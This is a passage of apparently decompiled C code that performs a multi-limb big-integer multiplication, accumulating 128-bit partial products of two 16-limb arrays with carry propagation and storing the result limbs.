  *((_QWORD *)&v245 + 1) += v242 + (unsigned __int64)v245 < v242;
  v247 = *((_QWORD *)&v245 + 1) + v243;
  v248 = (v247 < *((_QWORD *)&v245 + 1)) + v244;
  v249 = v3[9] * (unsigned __int128)v4[1];
  v250 = v246 + v249;
  *((_QWORD *)&v249 + 1) += v246 + (unsigned __int64)v249 < v246;
  v251 = *((_QWORD *)&v249 + 1) + v247;
  v252 = (v251 < *((_QWORD *)&v249 + 1)) + v248;
  v253 = v3[10] * (unsigned __int128)*v4;
  *(_QWORD *)&v253 = v250 + v253;
  v5[10] = v253;
  *((_QWORD *)&v253 + 1) += (unsigned __int64)v253 < v250;
  v254 = *((_QWORD *)&v253 + 1) + v251;
  v255 = (v254 < *((_QWORD *)&v253 + 1)) + v252;
  v256 = *v3 * (unsigned __int128)v4[11];
  v257 = v254 + v256;
  *((_QWORD *)&v256 + 1) += v254 + (unsigned __int64)v256 < v254;
  v258 = *((_QWORD *)&v256 + 1) + v255;
  v259 = v258 < *((_QWORD *)&v256 + 1);
  v260 = v3[1] * (unsigned __int128)v4[10];
  v261 = v257 + v260;
  *((_QWORD *)&v260 + 1) += v257 + (unsigned __int64)v260 < v257;
  v262 = *((_QWORD *)&v260 + 1) + v258;
  v263 = (v262 < *((_QWORD *)&v260 + 1)) + v259;
  v264 = v3[2] * (unsigned __int128)v4[9];
  v265 = v261 + v264;
  *((_QWORD *)&v264 + 1) += v261 + (unsigned __int64)v264 < v261;
  v266 = *((_QWORD *)&v264 + 1) + v262;
  v267 = (v266 < *((_QWORD *)&v264 + 1)) + v263;
  v268 = v3[3] * (unsigned __int128)v4[8];
  v269 = v265 + v268;
  *((_QWORD *)&v268 + 1) += v265 + (unsigned __int64)v268 < v265;
  v270 = *((_QWORD *)&v268 + 1) + v266;
  v271 = (v270 < *((_QWORD *)&v268 + 1)) + v267;
  v272 = v3[4] * (unsigned __int128)v4[7];
  v273 = v269 + v272;
  *((_QWORD *)&v272 + 1) += v269 + (unsigned __int64)v272 < v269;
  v274 = *((_QWORD *)&v272 + 1) + v270;
  v275 = (v274 < *((_QWORD *)&v272 + 1)) + v271;
  v276 = v3[5] * (unsigned __int128)v4[6];
  v277 = v273 + v276;
  *((_QWORD *)&v276 + 1) += v273 + (unsigned __int64)v276 < v273;
  v278 = *((_QWORD *)&v276 + 1) + v274;
  v279 = (v278 < *((_QWORD *)&v276 + 1)) + v275;
  v280 = v3[6] * (unsigned __int128)v4[5];
  v281 = v277 + v280;
  *((_QWORD *)&v280 + 1) += v277 + (unsigned __int64)v280 < v277;
  v282 = *((_QWORD *)&v280 + 1) + v278;
  v283 = (v282 < *((_QWORD *)&v280 + 1)) + v279;
  v284 = v3[7] * (unsigned __int128)v4[4];
  v285 = v281 + v284;
  *((_QWORD *)&v284 + 1) += v281 + (unsigned __int64)v284 < v281;
  v286 = *((_QWORD *)&v284 + 1) + v282;
  v287 = (v286 < *((_QWORD *)&v284 + 1)) + v283;
  v288 = v3[8] * (unsigned __int128)v4[3];
  v289 = v285 + v288;
  *((_QWORD *)&v288 + 1) += v285 + (unsigned __int64)v288 < v285;
  v290 = *((_QWORD *)&v288 + 1) + v286;
  v291 = (v290 < *((_QWORD *)&v288 + 1)) + v287;
  v292 = v3[9] * (unsigned __int128)v4[2];
  v293 = v289 + v292;
  *((_QWORD *)&v292 + 1) += v289 + (unsigned __int64)v292 < v289;
  v294 = *((_QWORD *)&v292 + 1) + v290;
  v295 = (v294 < *((_QWORD *)&v292 + 1)) + v291;
  v296 = v3[10] * (unsigned __int128)v4[1];
  v297 = v293 + v296;
  *((_QWORD *)&v296 + 1) += v293 + (unsigned __int64)v296 < v293;
  v298 = *((_QWORD *)&v296 + 1) + v294;
  v299 = (v298 < *((_QWORD *)&v296 + 1)) + v295;
  v300 = v3[11] * (unsigned __int128)*v4;
  *(_QWORD *)&v300 = v297 + v300;
  v5[11] = v300;
  *((_QWORD *)&v300 + 1) += (unsigned __int64)v300 < v297;
  v301 = *((_QWORD *)&v300 + 1) + v298;
  v302 = (v301 < *((_QWORD *)&v300 + 1)) + v299;
  v303 = *v3 * (unsigned __int128)v4[12];
  v304 = v301 + v303;
  *((_QWORD *)&v303 + 1) += v301 + (unsigned __int64)v303 < v301;
  v305 = *((_QWORD *)&v303 + 1) + v302;
  v306 = v305 < *((_QWORD *)&v303 + 1);
  v307 = v3[1] * (unsigned __int128)v4[11];
  v308 = v304 + v307;
  *((_QWORD *)&v307 + 1) += v304 + (unsigned __int64)v307 < v304;
  v309 = *((_QWORD *)&v307 + 1) + v305;
  v310 = (v309 < *((_QWORD *)&v307 + 1)) + v306;
  v311 = v3[2] * (unsigned __int128)v4[10];
  v312 = v308 + v311;
  *((_QWORD *)&v311 + 1) += v308 + (unsigned __int64)v311 < v308;
  v313 = *((_QWORD *)&v311 + 1) + v309;
  v314 = (v313 < *((_QWORD *)&v311 + 1)) + v310;
  v315 = v3[3] * (unsigned __int128)v4[9];
  v316 = v312 + v315;
  *((_QWORD *)&v315 + 1) += v312 + (unsigned __int64)v315 < v312;
  v317 = *((_QWORD *)&v315 + 1) + v313;
  v318 = (v317 < *((_QWORD *)&v315 + 1)) + v314;
  v319 = v3[4] * (unsigned __int128)v4[8];
  v320 = v316 + v319;
  *((_QWORD *)&v319 + 1) += v316 + (unsigned __int64)v319 < v316;
  v321 = *((_QWORD *)&v319 + 1) + v317;
  v322 = (v321 < *((_QWORD *)&v319 + 1)) + v318;
  v323 = v3[5] * (unsigned __int128)v4[7];
  v324 = v320 + v323;
  *((_QWORD *)&v323 + 1) += v320 + (unsigned __int64)v323 < v320;
  v325 = *((_QWORD *)&v323 + 1) + v321;
  v326 = (v325 < *((_QWORD *)&v323 + 1)) + v322;
  v327 = v3[6] * (unsigned __int128)v4[6];
  v328 = v324 + v327;
  *((_QWORD *)&v327 + 1) += v324 + (unsigned __int64)v327 < v324;
  v329 = *((_QWORD *)&v327 + 1) + v325;
  v330 = (v329 < *((_QWORD *)&v327 + 1)) + v326;
  v331 = v3[7] * (unsigned __int128)v4[5];
  v332 = v328 + v331;
  *((_QWORD *)&v331 + 1) += v328 + (unsigned __int64)v331 < v328;
  v333 = *((_QWORD *)&v331 + 1) + v329;
  v334 = (v333 < *((_QWORD *)&v331 + 1)) + v330;
  v335 = v3[8] * (unsigned __int128)v4[4];
  v336 = v332 + v335;
  *((_QWORD *)&v335 + 1) += v332 + (unsigned __int64)v335 < v332;
  v337 = *((_QWORD *)&v335 + 1) + v333;
  v338 = (v337 < *((_QWORD *)&v335 + 1)) + v334;
  v339 = v3[9] * (unsigned __int128)v4[3];
  v340 = v336 + v339;
  *((_QWORD *)&v339 + 1) += v336 + (unsigned __int64)v339 < v336;
  v341 = *((_QWORD *)&v339 + 1) + v337;
  v342 = (v341 < *((_QWORD *)&v339 + 1)) + v338;
  v343 = v3[10] * (unsigned __int128)v4[2];
  v344 = v340 + v343;
  *((_QWORD *)&v343 + 1) += v340 + (unsigned __int64)v343 < v340;
  v345 = *((_QWORD *)&v343 + 1) + v341;
  v346 = (v345 < *((_QWORD *)&v343 + 1)) + v342;
  v347 = v3[11] * (unsigned __int128)v4[1];
  v348 = v344 + v347;
  *((_QWORD *)&v347 + 1) += v344 + (unsigned __int64)v347 < v344;
  v349 = *((_QWORD *)&v347 + 1) + v345;
  v350 = (v349 < *((_QWORD *)&v347 + 1)) + v346;
  v351 = v3[12] * (unsigned __int128)*v4;
  *(_QWORD *)&v351 = v348 + v351;
  v5[12] = v351;
  *((_QWORD *)&v351 + 1) += (unsigned __int64)v351 < v348;
  v352 = *((_QWORD *)&v351 + 1) + v349;
  v353 = (v352 < *((_QWORD *)&v351 + 1)) + v350;
  v354 = *v3 * (unsigned __int128)v4[13];
  v355 = v352 + v354;
  *((_QWORD *)&v354 + 1) += v352 + (unsigned __int64)v354 < v352;
  v356 = *((_QWORD *)&v354 + 1) + v353;
  v357 = v356 < *((_QWORD *)&v354 + 1);
  v358 = v3[1] * (unsigned __int128)v4[12];
  v359 = v355 + v358;
  *((_QWORD *)&v358 + 1) += v355 + (unsigned __int64)v358 < v355;
  v360 = *((_QWORD *)&v358 + 1) + v356;
  v361 = (v360 < *((_QWORD *)&v358 + 1)) + v357;
  v362 = v3[2] * (unsigned __int128)v4[11];
  v363 = v359 + v362;
  *((_QWORD *)&v362 + 1) += v359 + (unsigned __int64)v362 < v359;
  v364 = *((_QWORD *)&v362 + 1) + v360;
  v365 = (v364 < *((_QWORD *)&v362 + 1)) + v361;
  v366 = v3[3] * (unsigned __int128)v4[10];
  v367 = v363 + v366;
  *((_QWORD *)&v366 + 1) += v363 + (unsigned __int64)v366 < v363;
  v368 = *((_QWORD *)&v366 + 1) + v364;
  v369 = (v368 < *((_QWORD *)&v366 + 1)) + v365;
  v370 = v3[4] * (unsigned __int128)v4[9];
  v371 = v367 + v370;
  *((_QWORD *)&v370 + 1) += v367 + (unsigned __int64)v370 < v367;
  v372 = *((_QWORD *)&v370 + 1) + v368;
  v373 = (v372 < *((_QWORD *)&v370 + 1)) + v369;
  v374 = v3[5] * (unsigned __int128)v4[8];
  v375 = v371 + v374;
  *((_QWORD *)&v374 + 1) += v371 + (unsigned __int64)v374 < v371;
  v376 = *((_QWORD *)&v374 + 1) + v372;
  v377 = (v376 < *((_QWORD *)&v374 + 1)) + v373;
  v378 = v3[6] * (unsigned __int128)v4[7];
  v379 = v375 + v378;
  *((_QWORD *)&v378 + 1) += v375 + (unsigned __int64)v378 < v375;
  v380 = *((_QWORD *)&v378 + 1) + v376;
  v381 = (v380 < *((_QWORD *)&v378 + 1)) + v377;
  v382 = v3[7] * (unsigned __int128)v4[6];
  v383 = v379 + v382;
  *((_QWORD *)&v382 + 1) += v379 + (unsigned __int64)v382 < v379;
  v384 = *((_QWORD *)&v382 + 1) + v380;
  v385 = (v384 < *((_QWORD *)&v382 + 1)) + v381;
  v386 = v3[8] * (unsigned __int128)v4[5];
  v387 = v383 + v386;
  *((_QWORD *)&v386 + 1) += v383 + (unsigned __int64)v386 < v383;
  v388 = *((_QWORD *)&v386 + 1) + v384;
  v389 = (v388 < *((_QWORD *)&v386 + 1)) + v385;
  v390 = v3[9] * (unsigned __int128)v4[4];
  v391 = v387 + v390;
  *((_QWORD *)&v390 + 1) += v387 + (unsigned __int64)v390 < v387;
  v392 = *((_QWORD *)&v390 + 1) + v388;
  v393 = (v392 < *((_QWORD *)&v390 + 1)) + v389;
  v394 = v3[10] * (unsigned __int128)v4[3];
  v395 = v391 + v394;
  *((_QWORD *)&v394 + 1) += v391 + (unsigned __int64)v394 < v391;
  v396 = *((_QWORD *)&v394 + 1) + v392;
  v397 = (v396 < *((_QWORD *)&v394 + 1)) + v393;
  v398 = v3[11] * (unsigned __int128)v4[2];
  v399 = v395 + v398;
  *((_QWORD *)&v398 + 1) += v395 + (unsigned __int64)v398 < v395;
  v400 = *((_QWORD *)&v398 + 1) + v396;
  v401 = (v400 < *((_QWORD *)&v398 + 1)) + v397;
  v402 = v3[12] * (unsigned __int128)v4[1];
  v403 = v399 + v402;
  *((_QWORD *)&v402 + 1) += v399 + (unsigned __int64)v402 < v399;
  v404 = *((_QWORD *)&v402 + 1) + v400;
  v405 = (v404 < *((_QWORD *)&v402 + 1)) + v401;
  v406 = v3[13] * (unsigned __int128)*v4;
  *(_QWORD *)&v406 = v403 + v406;
  v5[13] = v406;
  *((_QWORD *)&v406 + 1) += (unsigned __int64)v406 < v403;
  v407 = *((_QWORD *)&v406 + 1) + v404;
  v408 = (v407 < *((_QWORD *)&v406 + 1)) + v405;
  v409 = *v3 * (unsigned __int128)v4[14];
  v410 = v407 + v409;
  *((_QWORD *)&v409 + 1) += v407 + (unsigned __int64)v409 < v407;
  v411 = *((_QWORD *)&v409 + 1) + v408;
  v412 = v411 < *((_QWORD *)&v409 + 1);
  v413 = v3[1] * (unsigned __int128)v4[13];
  v414 = v410 + v413;
  *((_QWORD *)&v413 + 1) += v410 + (unsigned __int64)v413 < v410;
  v415 = *((_QWORD *)&v413 + 1) + v411;
  v416 = (v415 < *((_QWORD *)&v413 + 1)) + v412;
  v417 = v3[2] * (unsigned __int128)v4[12];
  v418 = v414 + v417;
  *((_QWORD *)&v417 + 1) += v414 + (unsigned __int64)v417 < v414;
  v419 = *((_QWORD *)&v417 + 1) + v415;
  v420 = (v419 < *((_QWORD *)&v417 + 1)) + v416;
  v421 = v3[3] * (unsigned __int128)v4[11];
  v422 = v418 + v421;
  *((_QWORD *)&v421 + 1) += v418 + (unsigned __int64)v421 < v418;
  v423 = *((_QWORD *)&v421 + 1) + v419;
  v424 = (v423 < *((_QWORD *)&v421 + 1)) + v420;
  v425 = v3[4] * (unsigned __int128)v4[10];
  v426 = v422 + v425;
  *((_QWORD *)&v425 + 1) += v422 + (unsigned __int64)v425 < v422;
  v427 = *((_QWORD *)&v425 + 1) + v423;
  v428 = (v427 < *((_QWORD *)&v425 + 1)) + v424;
  v429 = v3[5] * (unsigned __int128)v4[9];
  v430 = v426 + v429;
  *((_QWORD *)&v429 + 1) += v426 + (unsigned __int64)v429 < v426;
  v431 = *((_QWORD *)&v429 + 1) + v427;
  v432 = (v431 < *((_QWORD *)&v429 + 1)) + v428;
  v433 = v3[6] * (unsigned __int128)v4[8];
  v434 = v430 + v433;
  *((_QWORD *)&v433 + 1) += v430 + (unsigned __int64)v433 < v430;
  v435 = *((_QWORD *)&v433 + 1) + v431;
  v436 = (v435 < *((_QWORD *)&v433 + 1)) + v432;
  v437 = v3[7] * (unsigned __int128)v4[7];
  v438 = v434 + v437;
  *((_QWORD *)&v437 + 1) += v434 + (unsigned __int64)v437 < v434;
  v439 = *((_QWORD *)&v437 + 1) + v435;
  v440 = (v439 < *((_QWORD *)&v437 + 1)) + v436;
  v441 = v3[8] * (unsigned __int128)v4[6];
  v442 = v438 + v441;
  *((_QWORD *)&v441 + 1) += v438 + (unsigned __int64)v441 < v438;
  v443 = *((_QWORD *)&v441 + 1) + v439;
  v444 = (v443 < *((_QWORD *)&v441 + 1)) + v440;
  v445 = v3[9] * (unsigned __int128)v4[5];
  v446 = v442 + v445;
  *((_QWORD *)&v445 + 1) += v442 + (unsigned __int64)v445 < v442;
  v447 = *((_QWORD *)&v445 + 1) + v443;
  v448 = (v447 < *((_QWORD *)&v445 + 1)) + v444;
  v449 = v3[10] * (unsigned __int128)v4[4];
  v450 = v446 + v449;
  *((_QWORD *)&v449 + 1) += v446 + (unsigned __int64)v449 < v446;
  v451 = *((_QWORD *)&v449 + 1) + v447;
  v452 = (v451 < *((_QWORD *)&v449 + 1)) + v448;
  v453 = v3[11] * (unsigned __int128)v4[3];
  v454 = v450 + v453;
  *((_QWORD *)&v453 + 1) += v450 + (unsigned __int64)v453 < v450;
  v455 = *((_QWORD *)&v453 + 1) + v451;
  v456 = (v455 < *((_QWORD *)&v453 + 1)) + v452;
  v457 = v3[12] * (unsigned __int128)v4[2];
  v458 = v454 + v457;
  *((_QWORD *)&v457 + 1) += v454 + (unsigned __int64)v457 < v454;
  v459 = *((_QWORD *)&v457 + 1) + v455;
  v460 = (v459 < *((_QWORD *)&v457 + 1)) + v456;
  v461 = v3[13] * (unsigned __int128)v4[1];
  v462 = v458 + v461;
  *((_QWORD *)&v461 + 1) += v458 + (unsigned __int64)v461 < v458;
  v463 = *((_QWORD *)&v461 + 1) + v459;
  v464 = (v463 < *((_QWORD *)&v461 + 1)) + v460;
  v465 = v3[14] * (unsigned __int128)*v4;
  *(_QWORD *)&v465 = v462 + v465;
  v5[14] = v465;
  *((_QWORD *)&v465 + 1) += (unsigned __int64)v465 < v462;
  v466 = *((_QWORD *)&v465 + 1) + v463;
  v467 = (v466 < *((_QWORD *)&v465 + 1)) + v464;
  v468 = *v3 * (unsigned __int128)v4[15];
  v469 = v466 + v468;
  *((_QWORD *)&v468 + 1) += v466 + (unsigned __int64)v468 < v466;
  v470 = *((_QWORD *)&v468 + 1) + v467;
  v471 = v470 < *((_QWORD *)&v468 + 1);
  v472 = v3[1] * (unsigned __int128)v4[14];
  v473 = v469 + v472;
  *((_QWORD *)&v472 + 1) += v469 + (unsigned __int64)v472 < v469;
  v474 = *((_QWORD *)&v472 + 1) + v470;
  v475 = (v474 < *((_QWORD *)&v472 + 1)) + v471;
  v476 = v3[2] * (unsigned __int128)v4[13];
  v477 = v473 + v476;
  *((_QWORD *)&v476 + 1) += v473 + (unsigned __int64)v476 < v473;
  v478 = *((_QWORD *)&v476 + 1) + v474;
  v479 = (v478 < *((_QWORD *)&v476 + 1)) + v475;
  v480 = v3[3] * (unsigned __int128)v4[12];
  v481 = v477 + v480;
  *((_QWORD *)&v480 + 1) += v477 + (unsigned __int64)v480 < v477;
  v482 = *((_QWORD *)&v480 + 1) + v478;
  v483 = (v482 < *((_QWORD *)&v480 + 1)) + v479;
  v484 = v3[4] * (unsigned __int128)v4[11];
  v485 = v481 + v484;
  *((_QWORD *)&v484 + 1) += v481 + (unsigned __int64)v484 < v481;
  v486 = *((_QWORD *)&v484 + 1) + v482;
  v487 = (v486 < *((_QWORD *)&v484 + 1)) + v483;
  v488 = v3[5] * (unsigned __int128)v4[10];
  v489 = v485 + v488;
  *((_QWORD *)&v488 + 1) += v485 + (unsigned __int64)v488 < v485;
  v490 = *((_QWORD *)&v488 + 1) + v486;
  v491 = (v490 < *((_QWORD *)&v488 + 1)) + v487;
  v492 = v3[6] * (unsigned __int128)v4[9];
  v493 = v489 + v492;
  *((_QWORD *)&v492 + 1) += v489 + (unsigned __int64)v492 < v489;
  v494 = *((_QWORD *)&v492 + 1) + v490;
  v495 = (v494 < *((_QWORD *)&v492 + 1)) + v491;
  v496 = v3[7] * (unsigned __int128)v4[8];
  v497 = v493 + v496;
  *((_QWORD *)&v496 + 1) += v493 + (unsigned __int64)v496 < v493;
  v498 = *((_QWORD *)&v496 + 1) + v494;
  v499 = (v498 < *((_QWORD *)&v496 + 1)) + v495;
  v500 = v3[8] * (unsigned __int128)v4[7];
  v501 = v497 + v500;
  *((_QWORD *)&v500 + 1) += v497 + (unsigned __int64)v500 < v497;
  v502 = *((_QWORD *)&v500 + 1) + v498;
  v503 = (v502 < *((_QWORD *)&v500 + 1)) + v499;
  v504 = v3[9] * (unsigned __int128)v4[6];
  v505 = v501 + v504;
  *((_QWORD *)&v504 + 1) += v501 + (unsigned __int64)v504 < v501;
  v506 = *((_QWORD *)&v504 + 1) + v502;
  v507 = (v506 < *((_QWORD *)&v504 + 1)) + v503;
  v508 = v3[10] * (unsigned __int128)v4[5];
  v509 = v505 + v508;
  *((_QWORD *)&v508 + 1) += v505 + (unsigned __int64)v508 < v505;
  v510 = *((_QWORD *)&v508 + 1) + v506;
  v511 = (v510 < *((_QWORD *)&v508 + 1)) + v507;
  v512 = v3[11] * (unsigned __int128)v4[4];
  v513 = v509 + v512;
  *((_QWORD *)&v512 + 1) += v509 + (unsigned __int64)v512 < v509;
  v514 = *((_QWORD *)&v512 + 1) + v510;
  v515 = (v514 < *((_QWORD *)&v512 + 1)) + v511;
  v516 = v3[12] * (unsigned __int128)v4[3];
  v517 = v513 + v516;
  *((_QWORD *)&v516 + 1) += v513 + (unsigned __int64)v516 < v513;
  v518 = *((_QWORD *)&v516 + 1) + v514;
  v519 = (v518 < *((_QWORD *)&v516 + 1)) + v515;
  v520 = v3[13] * (unsigned __int128)v4[2];
  v521 = v517 + v520;
  *((_QWORD *)&v520 + 1) += v517 + (unsigned __int64)v520 < v517;
  v522 = *((_QWORD *)&v520 + 1) + v518;
  v523 = (v522 < *((_QWORD *)&v520 + 1)) + v519;
  v524 = v3[14] * (unsigned __int128)v4[1];
  v525 = v521 + v524;
  *((_QWORD *)&v524 + 1) += v521 + (unsigned __int64)v524 < v521;
  v526 = *((_QWORD *)&v524 + 1) + v522;
  v527 = (v526 < *((_QWORD *)&v524 + 1)) + v523;
  v528 = v3[15] * (unsigned __int128)*v4;
  *(_QWORD *)&v528 = v525 + v528;
  v5[15] = v528;
  *((_QWORD *)&v528 + 1) += (unsigned __int64)v528 < v525;
  v529 = *((_QWORD *)&v528 + 1) + v526;
  v530 = (v529 < *((_QWORD *)&v528 + 1)) + v527;
  v531 = v3[1] * (unsigned __int128)v4[15];
  v532 = v529 + v531;
  *((_QWORD *)&v531 + 1) += v529 + (unsigned __int64)v531 < v529;
  v533 = *((_QWORD *)&v531 + 1) + v530;
  v534 = v533 < *((_QWORD *)&v531 + 1);
  v535 = v3[2] * (unsigned __int128)v4[14];
  v536 = v532 + v535;
  *((_QWORD *)&v535 + 1) += v532 + (unsigned __int64)v535 < v532;
  v537 = *((_QWORD *)&v535 + 1) + v533;
  v538 = (v537 < *((_QWORD *)&v535 + 1)) + v534;
  v539 = v3[3] * (unsigned __int128)v4[13];
  v540 = v536 + v539;
  *((_QWORD *)&v539 + 1) += v536 + (unsigned __int64)v539 < v536;
  v541 = *((_QWORD *)&v539 + 1) + v537;
  v542 = (v541 < *((_QWORD *)&v539 + 1)) + v538;
  v543 = v3[4] * (unsigned __int128)v4[12];
  v544 = v540 + v543;
  *((_QWORD *)&v543 + 1) += v540 + (unsigned __int64)v543 < v540;
  v545 = *((_QWORD *)&v543 + 1) + v541;
  v546 = (v545 < *((_QWORD *)&v543 + 1)) + v542;
  v547 = v3[5] * (unsigned __int128)v4[11];
  v548 = v544 + v547;
  *((_QWORD *)&v547 + 1) += v544 + (unsigned __int64)v547 < v544;
  v549 = *((_QWORD *)&v547 + 1) + v545;
  v550 = (v549 < *((_QWORD *)&v547 + 1)) + v546;
  v551 = v3[6] * (unsigned __int128)v4[10];
  v552 = v548 + v551;
  *((_QWORD *)&v551 + 1) += v548 + (unsigned __int64)v551 < v548;
  v553 = *((_QWORD *)&v551 + 1) + v549;
  v554 = (v553 < *((_QWORD *)&v551 + 1)) + v550;
  v555 = v3[7] * (unsigned __int128)v4[9];
  v556 = v552 + v555;
  *((_QWORD *)&v555 + 1) += v552 + (unsigned __int64)v555 < v552;
  v557 = *((_QWORD *)&v555 + 1) + v553;
  v558 = (v557 < *((_QWORD *)&v555 + 1)) + v554;
  v559 = v3[8] * (unsigned __int128)v4[8];
  v560 = v556 + v559;
  *((_QWORD *)&v559 + 1) += v556 + (unsigned __int64)v559 < v556;
  v561 = *((_QWORD *)&v559 + 1) + v557;
  v562 = (v561 < *((_QWORD *)&v559 + 1)) + v558;
  v563 = v3[9] * (unsigned __int128)v4[7];
  v564 = v560 + v563;
  *((_QWORD *)&v563 + 1) += v560 + (unsigned __int64)v563 < v560;
  v565 = *((_QWORD *)&v563 + 1) + v561;
  v566 = (v565 < *((_QWORD *)&v563 + 1)) + v562;
  v567 = v3[10] * (unsigned __int128)v4[6];
  v568 = v564 + v567;
  *((_QWORD *)&v567 + 1) += v564 + (unsigned __int64)v567 < v564;
  v569 = *((_QWORD *)&v567 + 1) + v565;
  v570 = (v569 < *((_QWORD *)&v567 + 1)) + v566;
  v571 = v3[11] * (unsigned __int128)v4[5];
  v572 = v568 + v571;
  *((_QWORD *)&v571 + 1) += v568 + (unsigned __int64)v571 < v568;
  v573 = *((_QWORD *)&v571 + 1) + v569;
  v574 = (v573 < *((_QWORD *)&v571 + 1)) + v570;
  v575 = v3[12] * (unsigned __int128)v4[4];
  v576 = v572 + v575;
  *((_QWORD *)&v575 + 1) += v572 + (unsigned __int64)v575 < v572;
  v577 = *((_QWORD *)&v575 + 1) + v573;
  v578 = (v577 < *((_QWORD *)&v575 + 1)) + v574;
  v579 = v3[13] * (unsigned __int128)v4[3];
  v580 = v576 + v579;
  *((_QWORD *)&v579 + 1) += v576 + (unsigned __int64)v579 < v576;
  v581 = *((_QWORD *)&v579 + 1) + v577;
  v582 = (v581 < *((_QWORD *)&v579 + 1)) + v578;
  v583 = v3[14] * (unsigned __int128)v4[2];
  v584 = v580 + v583;
  *((_QWORD *)&v583 + 1) += v580 + (unsigned __int64)v583 < v580;
  v585 = *((_QWORD *)&v583 + 1) + v581;
  v586 = (v585 < *((_QWORD *)&v583 + 1)) + v582;
  v587 = v3[15] * (unsigned __int128)v4[1];
  *(_QWORD *)&v587 = v584 + v587;
  v5[16] = v587;
  *((_QWORD *)&v587 + 1) += (unsigned __int64)v587 < v584;
  v588 = *((_QWORD *)&v587 + 1) + v585;
  v589 = (v588 < *((_QWORD *)&v587 + 1)) + v586;
  v590 = v3[2] * (unsigned __int128)v4[15];
  v591 = v588 + v590;
  *((_QWORD *)&v590 + 1) += v588 + (unsigned __int64)v590 < v588;
  v592 = *((_QWORD *)&v590 + 1) + v589;
  v593 = v592 < *((_QWORD *)&v590 + 1);
  v594 = v3[3] * (unsigned __int128)v4[14];
  v595 = v591 + v594;
  *((_QWORD *)&v594 + 1) += v591 + (unsigned __int64)v594 < v591;
  v596 = *((_QWORD *)&v594 + 1) + v592;
  v597 = (v596 < *((_QWORD *)&v594 + 1)) + v593;
  v598 = v3[4] * (unsigned __int128)v4[13];
  v599 = v595 + v598;
  *((_QWORD *)&v598 + 1) += v595 + (unsigned __int64)v598 < v595;
  v600 = *((_QWORD *)&v598 + 1) + v596;
  v601 = (v600 < *((_QWORD *)&v598 + 1)) + v597;
  v602 = v3[5] * (unsigned __int128)v4[12];
  v603 = v599 + v602;
  *((_QWORD *)&v602 + 1) += v599 + (unsigned __int64)v602 < v599;
  v604 = *((_QWORD *)&v602 + 1) + v600;
  v605 = (v604 < *((_QWORD *)&v602 + 1)) + v601;
  v606 = v3[6] * (unsigned __int128)v4[11];
  v607 = v603 + v606;
  *((_QWORD *)&v606 + 1) += v603 + (unsigned __int64)v606 < v603;
  v608 = *((_QWORD *)&v606 + 1) + v604;
  v609 = (v608 < *((_QWORD *)&v606 + 1)) + v605;
  v610 = v3[7] * (unsigned __int128)v4[10];
  v611 = v607 + v610;
  *((_QWORD *)&v610 + 1) += v607 + (unsigned __int64)v610 < v607;
  v612 = *((_QWORD *)&v610 + 1) + v608;
  v613 = (v612 < *((_QWORD *)&v610 + 1)) + v609;
  v614 = v3[8] * (unsigned __int128)v4[9];
  v615 = v611 + v614;
  *((_QWORD *)&v614 + 1) += v611 + (unsigned __int64)v614 < v611;
  v616 = *((_QWORD *)&v614 + 1) + v612;
  v617 = (v616 < *((_QWORD *)&v614 + 1)) + v613;
  v618 = v3[9] * (unsigned __int128)v4[8];
  v619 = v615 + v618;
  *((_QWORD *)&v618 + 1) += v615 + (unsigned __int64)v618 < v615;
  v620 = *((_QWORD *)&v618 + 1) + v616;
  v621 = (v620 < *((_QWORD *)&v618 + 1)) + v617;
  v622 = v3[10] * (unsigned __int128)v4[7];
  v623 = v619 + v622;
  *((_QWORD *)&v622 + 1) += v619 + (unsigned __int64)v622 < v619;
  v624 = *((_QWORD *)&v622 + 1) + v620;
  v625 = (v624 < *((_QWORD *)&v622 + 1)) + v621;
  v626 = v3[11] * (unsigned __int128)v4[6];
  v627 = v623 + v626;
  *((_QWORD *)&v626 + 1) += v623 + (unsigned __int64)v626 < v623;
  v628 = *((_QWORD *)&v626 + 1) + v624;
  v629 = (v628 < *((_QWORD *)&v626 + 1)) + v625;
  v630 = v3[12] * (unsigned __int128)v4[5];
  v631 = v627 + v630;
  *((_QWORD *)&v630 + 1) += v627 + (unsigned __int64)v630 < v627;
  v632 = *((_QWORD *)&v630 + 1) + v628;
  v633 = (v632 < *((_QWORD *)&v630 + 1)) + v629;
  v634 = v3[13] * (unsigned __int128)v4[4];
  v635 = v631 + v634;
  *((_QWORD *)&v634 + 1) += v631 + (unsigned __int64)v634 < v631;
  v636 = *((_QWORD *)&v634 + 1) + v632;
  v637 = (v636 < *((_QWORD *)&v634 + 1)) + v633;
  v638 = v3[14] * (unsigned __int128)v4[3];
  v639 = v635 + v638;
  *((_QWORD *)&v638 + 1) += v635 + (unsigned __int64)v638 < v635;
  v640 = *((_QWORD *)&v638 + 1) + v636;
  v641 = (v640 < *((_QWORD *)&v638 + 1)) + v637;
  v642 = v3[15] * (unsigned __int128)v4[2];
  *(_QWORD *)&v642 = v639 + v642;
  v5[17] = v642;
  *((_QWORD *)&v642 + 1) += (unsigned __int64)v642 < v639;
  v643 = *((_QWORD *)&v642 + 1) + v640;
  v644 = (v643 < *((_QWORD *)&v642 + 1)) + v641;
  v645 = v3[3] * (unsigned __int128)v4[15];
  v646 = v643 + v645;
  *((_QWORD *)&v645 + 1) += v643 + (unsigned __int64)v645 < v643;
  v647 = *((_QWORD *)&v645 + 1) + v644;
  v648 = v647 < *((_QWORD *)&v645 + 1);
  v649 = v3[4] * (unsigned __int128)v4[14];
  v650 = v646 + v649;
  *((_QWORD *)&v649 + 1) += v646 + (unsigned __int64)v649 < v646;
  v651 = *((_QWORD *)&v649 + 1) + v647;
  v652 = (v651 < *((_QWORD *)&v649 + 1)) + v648;
  v653 = v3[5] * (unsigned __int128)v4[13];
  v654 = v650 + v653;
  *((_QWORD *)&v653 + 1) += v650 + (unsigned __int64)v653 < v650;
  v655 = *((_QWORD *)&v653 + 1) + v651;
  v656 = (v655 < *((_QWORD *)&v653 + 1)) + v652;
  v657 = v3[6] * (unsigned __int128)v4[12];
  v658 = v654 + v657;
  *((_QWORD *)&v657 + 1) += v654 + (unsigned __int64)v657 < v654;
  v659 = *((_QWORD *)&v657 + 1) + v655;
  v660 = (v659 < *((_QWORD *)&v657 + 1)) + v656;
  v661 = v3[7] * (unsigned __int128)v4[11];
  v662 = v658 + v661;
  *((_QWORD *)&v661 + 1) += v658 + (unsigned __int64)v661 < v658;
  v663 = *((_QWORD *)&v661 + 1) + v659;
  v664 = (v663 < *((_QWORD *)&v661 + 1)) + v660;
  v665 = v3[8] * (unsigned __int128)v4[10];
  v666 = v662 + v665;
  *((_QWORD *)&v665 + 1) += v662 + (unsigned __int64)v665 < v662;
